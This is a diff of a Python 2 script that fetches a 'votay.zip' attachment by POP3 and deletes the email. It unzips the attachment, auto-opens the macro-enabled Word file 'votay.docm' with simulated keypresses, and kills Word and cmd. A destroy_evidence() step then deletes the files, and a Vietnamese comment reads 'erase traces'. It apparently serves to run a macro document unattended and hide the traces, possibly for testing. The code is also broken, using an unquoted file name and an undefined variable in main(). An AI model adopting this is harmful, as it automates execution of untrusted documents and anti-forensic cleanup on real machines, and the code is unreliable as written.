@@ -7,6 +7,8 @@ import StringIO, rfc822
 import email.parser
 import thread # execute file
 import keyboard
+import base64
+import zipfile
 
 def wait(t):
 	while True:
@@ -37,42 +39,12 @@ def login():
 
 	return mailbox
 
-def readMail(mailbox):
-	expected_file = 'votay.docm'
-	# list items on server
-	resp, items, octets = mailbox.list()
+def unzipFile(name):
+	if name and ('.zip' in name):
+		with zipfile.ZipFile(votay.zip, 'r') as zip_ref:
+			zip_ref.extractall()
 
-	parser = email.parser.FeedParser()
-	# get id of the newest email
-	i = len(items) - 1
-	id = items[i].split()[0]
-	# get msg of the newest email
-	for msg in mailbox.retr(id)[1]:
-	#msg = mailbox.retr(id)[1]
-		parser.feed(msg + '\n')
-	message = parser.close()
-	payload = message.get_payload(decode = True)
-	print (payload)
-	# print (message)
-	return True
-
-	msg = ["\n".join(mssg[1]) for mssg in msg]
-	msg = [parser.Parser().parsestr(mssg) for mssg in msg]
-	msg = msg[0]
-
-	name = ''
-	for part in msg.walk():
-		if 'application' in part.get_content_type():
-			name = part.get_filename()
-			if name == expected_file:
-				print 'Downloading %s' % name
-				data = part.get_payload(decode=True)
-				f = open(name,' wb')
-				f.write(data)
-				f.close()
-				print 'Downloaded %s' % name
-				break
-
+def openFile(name):
 	if name and ('.docm' in name):
 		print 'Opening doc file'
 		thread.start_new_thread(os.system, (name, ))
@@ -92,19 +64,51 @@ def readMail(mailbox):
 		time.sleep(1)
 		keyboard.press_and_release('esc')
 
-		print 'turn off word'
+		print 'Turning off word'
 		time.sleep(2)
 		os.system('powershell Stop-Process -name WINWORD')
 		time.sleep(10)
 		os.system('powershell Stop-Process -name cmd')
 
-		# delete the email
-		print 'delete email'
-		server.dele(id)
-		return True
+def readMail(mailbox):
+	expected_file = 'votay.zip'
+	# list items on server
+	resp, items, octets = mailbox.list()
+
+	# get id of the newest email
+	id = items[-1].split()[0]
+
+	# get msg of the newest email
+	msg = mailbox.retr(id)[1]
+	msg = ["\n".join(msg)]
+	msg = [email.parser.Parser().parsestr(mssg) for mssg in msg]
+	msg = msg[0]
+
+	name = ''
+	for part in msg.walk():
+		print (part.get_content_type())
+		if 'application' in part.get_content_type():
+			name = part.get_filename()
+			if name == expected_file:
+				print 'Downloading %s' % name
+				data = part.get_payload(decode=True)
+				f = open(name,'wb')
+				f.write(data)
+				f.close()
+				print '%s was downloaded' % name
+				print 'Deleting email'
+				mailbox.dele(id)
+				return True
 
 	time.sleep(5)
 	return False
+
+def destroy_evidence():
+	try:
+		os.remove('votay.docm')
+		os.remove('votay.zip')
+	except Exception as e:
+		print e
 
 def main():
 	os.chdir('C:\Users\Administrator\Downloads')
@@ -121,7 +125,7 @@ def main():
 		try:
 			mailbox = login()
 			if mailbox:
-				print 'Login success'
+				print 'Login successful'
 				print "[+] Getting the expected email"
 				if readMail(mailbox):
 					mailbox.quit()
@@ -133,29 +137,14 @@ def main():
 				mailbox.quit()
 				print 'Logged out'
 		except Exception as e:
-			print ("Exception: " + str(e))
-			print 'Login failed'
+			print ("Login failed: " + str(e))
 			time.sleep(3)
-	exit()
+	unzipFile(name)
+	openFile(name)				
 	# xoa dau vet
-	time.sleep(120)
+	time.sleep(900)
 	print 'Destroying evidence'
-	
-	try:
-		os.remove('votay.docm')
-	except Exception as e:
-		print e
-
+	destroy_evidence()
 	print 'Done'
-
-def test():
-	try:
-		mailbox = login()
-		if mailbox:
-			print ("Succeed")
-		else:
-			print ("Failed")
-	except Exception as e:
-		print ("Exception: " + str(e))
 
 main()
